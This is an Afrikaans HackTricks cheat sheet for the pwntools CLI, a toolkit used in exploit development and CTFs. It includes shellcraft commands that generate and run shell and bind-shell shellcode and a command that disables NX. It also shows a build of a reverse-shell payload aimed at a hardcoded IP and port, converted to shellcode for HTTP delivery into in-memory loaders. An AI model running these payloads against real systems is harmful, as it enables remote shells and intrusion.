# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

Kry **opcodes** vanaf 'n reël of 'n lêer.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**Kan kies:**

- uitsettipe (raw,hex,string,elf)
- uitsetlêer-konteks (16,32,64,linux,windows...)
- vermy bytes (new lines, null, a list)
- kies encoder, debug shellcode met gdb, voer die uitset uit

## **Pwn checksec**

Checksec-skrip
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

Kry 'n patroon
```
pwn cyclic 3000
pwn cyclic -l faad
```
**Kan kies:**

- Die gebruikte alfabet (kleinletters standaard)
- Lengte van uniq pattern (standaard 4)
- context (16,32,64,linux,windows...)
- Neem die offset (-l)

## Pwn debug

Koppel GDB aan 'n proses
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**Kan kies:**

- Deur executable, deur name of deur pid context (16,32,64,linux,windows...)
- gdbscript om uit te voer
- sysrootpath

## Pwn disablenx

Skakel nx van 'n binary af
```
pwn disablenx <filepath>
```
## Pwn disasm

Ontleed hex opcodes
```
pwn disasm ffe4
```
**Kan kies:**

- konteks (16,32,64,linux,windows...)
- basisadres
- kleur (standaard)/geen kleur

## Pwn elfdiff

Wys verskille tussen 2 lêers
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

Kry heksadesimale voorstelling
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

Kry hexdump
```
pwn phd <file>
```
**Kan kies:**

- Aantal bytes om te wys
- Aantal bytes per reël highlight byte
- Slaan bytes aan die begin oor

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

Kry shellcodes
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**Kan kies:**

- shellcode en argumente vir die shellcode
- Uitlêer
- uitvoerformaat
- debug (koppel dbg aan shellcode)
- before (debug trap before code)
- na
- vermy opcodes (standaard: nie null en new line nie)
- Voer die shellcode uit
- Kleur/geen kleur
- lys syscalls
- lys moontlike shellcodes
- Genereer 'n ELF as 'n shared library

## Pwn template

Kry 'n python-sjabloon
```
pwn template
```
**Kan kies:** host, port, user, pass, path and quiet

## Pwn unhex

Van hex na string
```
pwn unhex 686f6c61
```
## Pwn opdatering

Om pwntools op te dateer
```
pwn update
```
## ELF → raw shellcode packaging (loader_append)

Pwntools kan 'n standalone ELF omskakel na 'n enkele raw shellcode‑blob wat sy eie segmente self in kaart bring en uitvoering oordra na die oorspronklike entrypoint. Dit is ideaal vir memory‑only loaders (bv., Android apps wat JNI aanroep om afgelaaide bytes uit te voer).

Typical pipeline (amd64 example)

1) Bou 'n statiese, posisie‑onafhanklike payload ELF (musl aanbeveel vir draagbaarheid):
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) Skakel ELF → shellcode met pwntools:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) Lewer sc aan 'n memory loader (bv. via HTTP[S]) en voer dit in‑proses uit.

Aantekeninge
- loader_append inkorporeer die oorspronklike ELF-program in die shellcode en genereer 'n klein loader wat die segmentte mmaps en na die entry spring.
- Wees eksplisiet oor die argitektuur via context.clear(arch=...). arm64 is algemeen op Android.
- Hou jou payload se kode posisie‑onafhanklik en vermy aannames oor proses ASLR/NX.

## Verwysings

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode-pipeline wat gebruik word vir Android in-memory uitvoering](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
